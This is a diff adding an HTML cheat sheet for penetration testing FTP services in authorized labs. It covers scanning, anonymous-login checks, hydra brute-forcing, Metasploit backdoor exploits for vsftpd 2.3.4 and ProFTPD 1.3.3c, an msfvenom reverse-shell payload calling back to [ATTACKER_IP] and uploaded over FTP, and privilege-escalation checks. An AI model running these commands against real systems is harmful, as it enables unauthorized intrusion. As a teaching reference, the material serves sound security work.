@@ -1,0 +1,426 @@
+<!DOCTYPE html>
+
+<html dir="ltr" lang="en">
+<head>
+<meta charset="utf-8"/>
+<title>FTP — Pentest Cheat Sheet</title>
+<style>
+  :root{
+    --bg:#0b0b0b;
+    --panel:#141414;
+    --panel-2:#1a1a1a;
+    --border:#2b2b2b;
+    --gold:#d4af37;
+    --gold-dim:#8a712a;
+    --yellow:#e8c547;
+    --text:#e9e6da;
+    --text-dim:#a19c8c;
+    --mono:#f2e6b8;
+    --green:#7fae4a;
+    --red:#b5544a;
+  }
+  *{box-sizing:border-box;}
+  body{
+    background:var(--bg);
+    color:var(--text);
+    font-family:"Tahoma","Segoe UI",sans-serif;
+    margin:0;
+    padding:0 0 4rem;
+    line-height:1.7;
+  }
+  .wrap{max-width:900px;margin:0 auto;padding:2rem 1.5rem;}
+
+  .hero{
+    border-bottom:1px solid var(--border);
+    padding-bottom:1.5rem;
+    margin-bottom:2rem;
+  }
+  .hero .tag{
+    display:inline-block;
+    font-family:"Consolas","Courier New",monospace;
+    font-size:13px;
+    color:var(--bg);
+    background:var(--gold);
+    padding:2px 10px;
+    border-radius:3px;
+    margin-bottom:10px;
+    letter-spacing:.5px;
+  }
+  .hero h1{
+    font-size:30px;
+    margin:0 0 6px;
+    color:var(--yellow);
+  }
+  .hero p{color:var(--text-dim);margin:0;font-size:14px;}
+  .signature{display:inline-flex;align-items:center;gap:6px;margin-top:14px;font-family:"Consolas",monospace;font-size:11.5px;color:var(--gold-dim);border:1px solid var(--border);padding:4px 10px;border-radius:20px;}
+  .signature b{color:var(--gold);font-weight:normal;}
+
+  .stage{
+    margin-bottom:2.2rem;
+    background:var(--panel);
+    border:1px solid var(--border);
+    border-right:3px solid var(--gold);
+    border-radius:6px;
+    padding:1.2rem 1.4rem;
+  }
+  .stage h2{
+    color:var(--gold);
+    font-size:19px;
+    margin:0 0 4px;
+    display:flex;
+    align-items:center;
+    gap:8px;
+  }
+  .stage .desc{color:var(--text-dim);font-size:13.5px;margin:0 0 14px;}
+
+  h3.sub{
+    color:var(--yellow);
+    font-size:15px;
+    margin:18px 0 8px;
+    border-bottom:1px dashed var(--border);
+    padding-bottom:5px;
+  }
+  h3.sub:first-of-type{margin-top:0;}
+
+  .step{
+    margin-bottom:14px;
+    padding-bottom:14px;
+    border-bottom:1px dashed var(--border);
+  }
+  .step:last-child{border-bottom:none;margin-bottom:0;padding-bottom:0;}
+  .step-title{
+    font-size:14.5px;
+    color:var(--text);
+    margin-bottom:6px;
+    font-weight:bold;
+  }
+  .where{
+    display:inline-block;
+    font-family:"Consolas","Courier New",monospace;
+    font-size:11px;
+    background:var(--panel-2);
+    color:var(--yellow);
+    border:1px solid var(--gold-dim);
+    padding:1px 8px;
+    border-radius:10px;
+    margin-inline-start:8px;
+    vertical-align:middle;
+  }
+  .cmd{
+    background:#0e0e0e;
+    border:1px solid var(--border);
+    border-radius:5px;
+    padding:10px 14px;
+    font-family:"Consolas","Courier New",monospace;
+    font-size:13.5px;
+    color:var(--mono);
+    direction:ltr;
+    text-align:left;
+    overflow-x:auto;
+    margin:6px 0;
+    white-space:pre;
+  }
+  .cmd .cm{color:#6b6b6b;}
+  .note{
+    font-size:12.5px;
+    color:var(--text-dim);
+    margin-top:4px;
+  }
+  .note b{color:var(--yellow);font-weight:normal;}
+  .tip{
+    background:rgba(212,175,55,.08);
+    border-inline-start:2px solid var(--gold);
+    padding:8px 12px;
+    font-size:12.5px;
+    color:var(--text-dim);
+    border-radius:3px;
+    margin-top:8px;
+  }
+  .danger{
+    background:rgba(181,84,74,.08);
+    border-inline-start:2px solid var(--red);
+    padding:8px 12px;
+    font-size:12.5px;
+    color:var(--text-dim);
+    border-radius:3px;
+    margin-top:8px;
+  }
+  .result{
+    font-size:12.5px;
+    color:var(--green);
+    margin-top:6px;
+    font-family:"Consolas","Courier New",monospace;
+    direction:ltr;
+    text-align:left;
+  }
+  .grid2{display:grid;grid-template-columns:1fr 1fr;gap:10px;}
+  @media (max-width:640px){.grid2{grid-template-columns:1fr;}}
+
+  .toc{
+    background:var(--panel);
+    border:1px solid var(--border);
+    border-radius:6px;
+    padding:1rem 1.3rem;
+    margin-bottom:2rem;
+    font-size:13.5px;
+  }
+  .toc .ttl{color:var(--yellow);font-weight:bold;margin-bottom:8px;display:block;}
+  .toc ol{margin:0;padding-inline-start:20px;color:var(--text-dim);}
+  .toc li{margin-bottom:4px;}
+  .toc a{color:var(--text-dim);text-decoration:none;}
+  .toc a:hover{color:var(--yellow);}
+
+  .portnote{
+    background:var(--panel-2);
+    border:1px solid var(--gold-dim);
+    border-radius:6px;
+    padding:.8rem 1.1rem;
+    margin-bottom:2rem;
+    font-size:13px;
+    color:var(--text-dim);
+  }
+  .portnote b{color:var(--yellow);}
+
+  .badge{
+    display:inline-block;
+    font-size:10px;
+    padding:1px 7px;
+    border-radius:8px;
+    margin-inline-start:6px;
+    font-family:"Consolas",monospace;
+    vertical-align:middle;
+  }
+  .badge.win{background:#1c2733;color:#8fb3ff;border:1px solid #2e4560;}
+  .badge.lin{background:#1a2417;color:#9fd97b;border:1px solid #33502a;}
+
+  footer{
+    text-align:center;
+    color:var(--text-dim);
+    font-size:11.5px;
+    margin-top:3rem;
+    padding-top:1.2rem;
+    border-top:1px solid var(--border);
+  }
+  footer .author{color:var(--gold);font-size:13px;margin-bottom:6px;}
+  footer .disclaimer{max-width:560px;margin:0 auto;color:#7a7666;font-size:11px;line-height:1.6;}
+</style>
+<style>html[dir="ltr"] body{direction:ltr;text-align:left}html[dir="ltr"] .stage{border-right:1px solid var(--border);border-left:3px solid var(--gold)}html[dir="ltr"] .toc,html[dir="ltr"] .portnote,html[dir="ltr"] .note,html[dir="ltr"] .tip,html[dir="ltr"] .danger,html[dir="ltr"] .result{text-align:left}</style></head>
+<body>
+<div class="wrap">
+<div class="hero">
+<span class="tag">PORT 21 / TCP — FILE TRANSFER PROTOCOL</span>
+<h1>FTP — Practical Assessment Reference</h1>
+<p>Quick service reference for authorized labs: discovery, enumeration, validation, access assessment, and documentation for FTP.</p>
+<div class="signature">✒ <b>Abdullah Nasser Almsan</b> — Personal Pentest Reference</div>
+</div>
+<div class="portnote"><b>Service note: </b>Ports, versions, and deployment details can vary by configuration. Confirm the actual service fingerprint instead of relying only on a default port.</div>
+<div class="toc">
+<span class="ttl">CONTENTS</span>
+<ol>
+<li><a href="#s1">Reconnaissance</a></li>
+<li><a href="#s2">Port Scanning</a></li>
+<li><a href="#s3">Enumeration</a></li>
+<li><a href="#s4">Credential Testing</a></li>
+<li><a href="#s5">Exploitation</a></li>
+<li><a href="#s6">Post-Exploitation</a></li>
+</ol>
+</div>
+<!-- STAGE 1 -->
+<div class="stage" id="s1">
+<h2>1. Reconnaissance</h2>
+<p class="desc">Confirm the target, network path, and basic reachability before deeper testing.</p>
+<div class="step">
+<div class="step-title">Review the local network interfaces <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">ip a 
+# or
+
+ifconfig</div>
+<div class="note">Review the returned output, verify it against the current service, and record only the evidence needed for the authorized lab.</div>
+</div>
+<div class="step">
+<div class="step-title">Check basic target reachability <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">ping -c 4 [TARGET]</div>
+<div class="result">REFERENCE — Treat the step as successful only when the expected service response or evidence is actually returned and can be verified.</div>
+<div class="note">Review the returned output, verify it against the current service, and record only the evidence needed for the authorized lab.</div>
+</div>
+<div class="step">
+<div class="step-title">Discover live hosts in the authorized subnet <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">nmap -sn [SUBNET] 
+# or
+
+netdiscover -r [SUBNET]</div>
+</div>
+</div>
+<!-- STAGE 2 -->
+<div class="stage" id="s2">
+<h2>2. Port Scanning</h2>
+<p class="desc">Identify exposed ports, service versions, and relevant protocols before enumeration.</p>
+<div class="step">
+<div class="step-title">Run the required Nmap service check <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">nmap -sS -sV [TARGET]</div>
+<div class="result">REFERENCE — Treat the step as successful only when the expected service response or evidence is actually returned and can be verified.</div>
+</div>
+<div class="step">
+<div class="step-title">Run the required Nmap service check <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">nmap -p- --min-rate=1000 -T4 [TARGET]</div>
+<div class="tip">Tip: verify the service, version, and prerequisites before moving to the next step.</div>
+</div>
+<div class="step">
+<div class="step-title">Run the required Nmap service check <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">nmap -p21 -sV -sC -A [TARGET]</div>
+<div class="note">Review the returned output, verify it against the current service, and record only the evidence needed for the authorized lab.</div>
+</div>
+</div>
+<!-- STAGE 3 -->
+<div class="stage" id="s3">
+<h2>3. Enumeration</h2>
+<p class="desc">Collect service metadata and enumerate only the information needed for the authorized lab.</p>
+<h3 class="sub">Service Detection</h3>
+<div class="step">
+<div class="step-title">Run the required Nmap service check <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">nmap -p21 -sV [TARGET]</div>
+<div class="result">REFERENCE — Treat the step as successful only when the expected service response or evidence is actually returned and can be verified.</div>
+</div>
+<div class="step">
+<div class="step-title">Run the documented check: use auxiliary/scanner/ftp/ftp_version <span class="where">MSFCONSOLE</span></div>
+<div class="cmd">use auxiliary/scanner/ftp/ftp_version
+set RHOSTS [TARGET]
+run</div>
+</div>
+<h3 class="sub">Anonymous Login</h3>
+<div class="grid2">
+<div class="step" style="border-bottom:none;">
+<div class="step-title">Run the required Nmap service check <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">nmap -p21 --script=ftp-anon [TARGET]</div>
+<div class="result">REFERENCE — Treat the step as successful only when the expected service response or evidence is actually returned and can be verified.</div>
+</div>
+<div class="step" style="border-bottom:none;">
+<div class="step-title">Run the documented check: use auxiliary/scanner/ftp/anonymous <span class="where">MSFCONSOLE</span></div>
+<div class="cmd">use auxiliary/scanner/ftp/anonymous
+set RHOSTS [TARGET]
+run</div>
+</div>
+</div>
+<div class="step">
+<div class="step-title">Connect to the FTP service <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">ftp [TARGET]
+
+# when a username is requested
+
+anonymous
+
+# when a password is requested (follow the lab instructions)
+
+[Enter]</div>
+<div class="note">Review the returned output, verify it against the current service, and record only the evidence needed for the authorized lab.</div>
+</div>
+<h3 class="sub">Additional checks</h3>
+<div class="step">
+<div class="step-title">Run the required Nmap service check <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">nmap -p21 --script=ftp-syst [TARGET]</div>
+</div>
+<div class="step">
+<div class="step-title">Run the required Nmap service check <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">nmap -p21 --script vuln [TARGET]</div>
+<div class="note">Review the returned output, verify it against the current service, and record only the evidence needed for the authorized lab.</div>
+</div>
+<h3 class="sub">Additional checks</h3>
+<div class="step">
+<div class="step-title">Run the documented check: ftp&gt; ls -la <span class="where">FTP CLIENT</span></div>
+<div class="cmd">ftp&gt; ls -la
+ftp&gt; cd [DIR]
+ftp&gt; get [FILE]
+ftp&gt; binary  
+# before downloading binary files
+
+ftp&gt; mget *   
+# download all files in the current directory</div>
+</div>
+</div>
+<!-- STAGE 4 -->
+<div class="stage" id="s4">
+<h2>4. Credential Testing</h2>
+<p class="desc">Assess authentication with known or explicitly authorized credentials only.</p>
+<div class="step">
+<div class="step-title">Run the authorized credential check <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">hydra -L [USERLIST] -P [WORDLIST] [TARGET] -t 4 ftp</div>
+<div class="note">Review the returned output, verify it against the current service, and record only the evidence needed for the authorized lab.</div>
+</div>
+<div class="step">
+<div class="step-title">Run the documented check: use auxiliary/scanner/ftp/ftp_login <span class="where">MSFCONSOLE</span></div>
+<div class="cmd">use auxiliary/scanner/ftp/ftp_login
+set RHOSTS [TARGET]
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+run</div>
+<div class="result">REFERENCE — Treat the step as successful only when the expected service response or evidence is actually returned and can be verified.</div>
+</div>
+<div class="step">
+<div class="step-title">Connect to the FTP service <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">ftp [TARGET]
+<span class="cm"># Username:</span> [USERNAME]
+<span class="cm"># Password:</span> [PASSWORD]</div>
+<div class="result">REFERENCE — Treat the step as successful only when the expected service response or evidence is actually returned and can be verified.</div>
+</div>
+</div>
+<!-- STAGE 5 -->
+<div class="stage" id="s5">
+<h2>5. Exploitation</h2>
+<p class="desc">Match any test to the confirmed service, version, prerequisites, and approved scope before proceeding.</p>
+<h3 class="sub">Linux — vsftpd 2.3.4 Backdoor <span class="badge lin">LINUX</span></h3>
+<div class="step">
+<div class="step-title">Run the documented check: msfconsole -q <span class="where">MSFCONSOLE</span></div>
+<div class="cmd">msfconsole -q
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOST [TARGET]
+exploit</div>
+<div class="result">REFERENCE — Treat the step as successful only when the expected service response or evidence is actually returned and can be verified.</div>
+<div class="tip">Tip: verify the service, version, and prerequisites before moving to the next step.</div>
+</div>
+<h3 class="sub">Linux — ProFTPD 1.3.3c Backdoor <span class="badge lin">LINUX</span></h3>
+<div class="step">
+<div class="step-title">Run the documented check: use exploit/unix/ftp/proftpd_133c_backdoor <span class="where">MSFCONSOLE</span></div>
+<div class="cmd">use exploit/unix/ftp/proftpd_133c_backdoor
+set RHOST [TARGET]
+exploit</div>
+</div>
+<h3 class="sub">Windows — IIS FTP <span class="badge win">WINDOWS</span></h3>
+<div class="step">
+<div class="step-title">Run the documented check: msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ATTACKER_IP <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ATTACKER_IP] LPORT=[PORT] -f asp -o shell.asp</div>
+<div class="note">Review the returned output, verify it against the current service, and record only the evidence needed for the authorized lab.</div>
+<div class="step" style="border:none;padding:0;margin-top:10px;">
+<div class="step-title">Run the documented check: ftp&gt; binary <span class="where">FTP CLIENT</span></div>
+<div class="cmd">ftp&gt; binary
+ftp&gt; put shell.asp</div>
+</div>
+</div>
+<div class="danger">Warning: use this step only in an authorized lab or explicitly permitted assessment. Avoid disruptive changes unless they are part of the approved scope.</div>
+</div>
+<!-- STAGE 6 -->
+<div class="stage" id="s6">
+<h2>6. Post-Exploitation</h2>
+<p class="desc">Match any test to the confirmed service, version, prerequisites, and approved scope before proceeding.</p>
+<div class="step">
+<div class="step-title">Run the documented check: whoami <span class="where">VICTIM SHELL</span></div>
+<div class="cmd">whoami
+id</div>
+</div>
+<div class="step">
+<div class="step-title">Run the documented check: python3 -c 'import pty; pty.spawn("/bin/bash")' <span class="where">VICTIM SHELL</span></div>
+<div class="cmd">python3 -c 'import pty; pty.spawn("/bin/bash")'</div>
+</div>
+<div class="step">
+<div class="step-title">Run the documented check: sudo -l <span class="where">VICTIM SHELL</span></div>
+<div class="cmd">sudo -l
+find / -perm -4000 -type f 2&gt;/dev/null</div>
+</div>
+<div class="tip">Tip: verify the service, version, and prerequisites before moving to the next step.</div>
+</div>
+<footer>
+<div class="author">Prepared by Abdullah Nasser Almsan</div>
+<div class="disclaimer">Personal technical reference for learning and authorized penetration-testing labs only. The author is not responsible for misuse or unauthorized activity outside the approved scope.</div>
+</footer>
+</div>
+</body>
+</html>
